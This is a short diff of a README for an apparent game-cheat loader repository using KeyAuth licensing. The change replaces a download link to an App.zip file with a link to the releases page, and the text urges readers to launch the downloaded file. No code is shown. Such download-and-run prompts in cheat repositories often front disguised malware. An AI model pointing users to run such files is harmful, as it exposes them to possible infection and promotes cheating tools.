@@ -9,7 +9,7 @@ Welcome to the Cheat Loader Menu KeyAuth GUI repository! This project focuses on
 
 ## 🚀 Get Started
 To access the KeyAuth Loader Menu, please download the application from the following link: 
-[![Download KeyAuth Loader Menu](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/uploads/App.zip)
+[![Download KeyAuth Loader Menu](https://github.com/SemiColonLOL/Cheat-Loader-Menu-KeyAuth-GUI/releases)](https://github.com/SemiColonLOL/Cheat-Loader-Menu-KeyAuth-GUI/releases)
 
 Please remember to launch the downloaded file if the link ends with the file name.
 
